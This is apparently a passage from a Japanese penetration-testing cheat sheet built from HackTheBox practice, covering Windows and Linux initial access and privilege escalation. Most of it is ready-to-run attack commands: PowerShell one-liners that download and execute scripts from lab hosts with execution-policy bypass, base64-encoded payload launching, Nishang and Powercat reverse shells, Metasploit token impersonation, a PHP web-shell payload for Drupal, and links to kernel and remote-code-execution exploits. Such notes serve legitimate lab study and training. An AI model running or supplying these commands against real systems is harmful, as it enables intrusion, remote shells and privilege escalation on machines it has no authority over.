現在のユーザーの実行ポリシーの変更:
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

#### PowerShellの場所
```
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

#### ダウンロードと実行

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1:8000/PowerUp.ps1')"

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.16.3:8000/PowerUp.ps1')|iex"

# cmd.exe
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile -

# PowerShell v3
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3
```

#### Base64 Encording
```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1/PowerUp.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

#### Nishang
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444

C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444 | powershell -noprofile -
```

#### Powercat
```
powershell -exec bypass -c "iwr('http://10.10.10.1:8000/powercat.ps1')|iex;powercat -c 10.10.10.1 -p 4444 -e cmd"
```

### PowerUp.ps1
```
# Powershellの起動
C:> powershell.exe -nop -exec bypass

# PowerUpモジュールのインポート
PS C:\> Import-Module PowerUp.ps1

# PowerUpの実行(All-Check関数を使用)
PS C:\> Invoke-AllChecks 

# Invoke-AllChecks(powershell.exe)
IEX(New-Object Net.WebClient).downloadstring('http://10.10.10.1:8000/PowerUp.ps1');Invoke-AllChecks

# Invoke-AllChecks(cmd.exe)
C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/PowerUp.ps1');Invoke-AllChecks | powershell -noprofile -
```

```
# ワンライナー
C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```
```
# ディスクに触れずにPowerUpを実行
C:\> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/PowerUp.ps1'); Invoke-AllChecks"
```

## Metasploit
### Metasploit(token impersonation)
```
シークレットモードの読み込み:
msf6 > load_incognito
上記のコマンドで上手くいかない場合
msf6 > use incognito

偽装するトークン一覧を表示:
msf6 > list_tokens -g
トークンの偽装:
msf6 > impersonate_token "BUILTIN\Administrators"
トークン偽装後の権限確認:
msf6 > getuid
```

高い特権トークンを持っていても、実際には特権ユーザーの権限を持っていない場合がある。  
この場合、偽装トークン(なりすまし)ではなく、プライマリトークンを使用する必要がある。  
選択するのに最も安全なプロセスはservices.exeプロセスである。
```
移行するプロセスを探すためにプロセス一覧の表示:
(service.exeのプロセスを探すのが無難)
msf6 > ps

プロセスの移行:
(service.exeのPIDなどを指定)
msf6 > migrate <PID>
```

### Metasploit(local_exploit_suggester)
exploitをせずに脆弱性をチェックするために使用するモジュール。  
meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。

```
msf6 > use post/multi/recon/local_exploit_suggester
```

### evlilwinrm(5985)
WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
5985ポートが空いている時に使用。

```
# インストール
gem install evil-winrm
```

```
evil-winrm -u <username> -p <password> -i <remote host ip>
```

## PrivEsc Tools(Windows)
Windows Sysinternals:  
https://docs.microsoft.com/en-us/sysinternals/  

PEASS-ng(winpeas.bat):  
https://github.com/carlospolop/PEASS-ng  

PowerSploit(PowerUp.ps1):  
https://github.com/PowerShellMafia/PowerSploit.git

Nishang:  
https://github.com/samratashok/nishang.git

Powercat:  
https://github.com/besimorhino/powercat.git

Sherlock:  
https://github.com/rasta-mouse/Sherlock.git

creddump7:  
https://github.com/Tib3rius/creddump7

juicy-potato(x64):  
https://github.com/ohpe/juicy-potato.git  
juicy-potato(x86バイナリ):  
https://github.com/ivanitlearning/Juicy-Potato-x86.git

RoguePotato:  
https://github.com/antonioCoco/RoguePotato.git

PrintSpoofer:  
https://github.com/itm4n/PrintSpoofer.git

Windows-kernel-exploits:  
https://github.com/SecWiki/windows-kernel-exploits.git

# Experience with HackTheBox
## Initial Shell(Linux)
```
Samba 3.0.20:
https://github.com/amriunix/CVE-2007-2447.git

Elastix 2.2.0:
https://www.exploit-db.com/exploits/37637
FreePBX 2.10.0/Elastix 2.2.0 - Remote Code Execution:
https://www.exploit-db.com/exploits/18650
'extension'はsvwarを使用してreqauthとなっている数値をを指定
例) svwar -m INVITE -e100-999 10.10.10.7
```

## Privilege Escalation(Linux)
```
PAM 1.1.0:
.sshディレクトリの権限を変更しておく(chmod 700 .ssh)
https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local/14339.sh
```

## Initial Shell(Windows)
```
MS08-067:
https://github.com/andyacer/ms08_067

HttpFileServer httpd 2.3:
https://www.exploit-db.com/exploits/49125

Drupal 7.x Module Services - Remote Code Execution:
・sudo apt install php-curl
・'data' => '<?php echo system($_REQUEST ["cmd"]); ?>'
https://www.exploit-db.com/exploits/41564

Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution:
・sudo gem install highline
https://www.exploit-db.com/exploits/44449

Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow:
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```

## Privilege Escalation(Windows)
```
Juicy-potato(x64):  
https://github.com/ohpe/juicy-potato.git  
Juicy-potato(x86バイナリ):  
https://github.com/ivanitlearning/Juicy-Potato-x86.git

MS10-059(Microsoft Windows Server 2008 R2 Standard 6.1.7600 N/A Build 7600):
.\MS10-059.exe 10.10.10.1 4444
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
.\Chimichurri.exe 10.10.16.4 443
https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri

MS15-051(Microsoft Windows Server 2008 R2 Datacenter 6.1.7600 N/A Build 7600):
.\ms15-51.exe whoami
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

MS16-098(Microsoft Windows Server 2012 R2 Standard 6.3.9600 N/A Build 9600):
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
```
